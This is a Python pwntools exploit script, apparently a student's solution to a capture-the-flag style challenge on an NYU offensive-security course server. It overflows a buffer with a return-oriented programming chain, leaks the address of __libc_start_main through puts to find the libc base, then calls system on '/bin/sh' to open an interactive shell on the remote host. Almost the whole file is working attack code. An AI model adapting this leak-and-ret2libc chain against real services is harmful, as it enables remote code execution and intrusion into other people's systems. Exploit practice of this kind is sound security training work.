from pwn import *

#context.log_level = 'debug'

#p = process("./rop") #local
p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1343) #remote
p.recvuntil(":") #remote
p.sendline("jd3846") #remote
p.recvline()
#gdb.attach(p)

pop_rbp = 0x400555 # pop rbp ; ret
pop_rdi = 0x4006b3 # pop rdi ; ret
pop_rsi = 0x4006b1 #pop rsi ; pop r15 ; ret
main = 0x400621
puts = 0x4004c0
start_main = 0x601020
#binsh = 0x1a3f20 #local
binsh = 0x180503 #remote

chain = 'A' * 0x20 + 'A' * 8

#leak libc
chain += p64(pop_rdi) + p64(start_main) + p64(puts) + p64(main)

p.recvuntil("..")
p.sendline(chain)

p.recvline()
leak = p.recvline().strip('\n ')
addr = u64(leak+'\x00'*(8-len(leak)))
#print leak
#print ".."
#print hex(addr)

#e = ELF("/lib/x86_64-linux-gnu/libc-2.26.so") #local
e = ELF("libc-2.19.so") #remote

base = addr - e.symbols['__libc_start_main']
system = base + e.symbols['system']
binsh = base + binsh

#print hex(base)
#print hex(system)

chain = 'A' * 0x20 + 'A' * 8
chain += p64(pop_rdi) + p64(binsh) + p64(system)

p.recvuntil("..")
p.sendline(chain)

p.interactive()


#requirements for shell from syscall
#rax = 0x3b
#rdi = bin sh
#rsi = 0
#rdx = 0
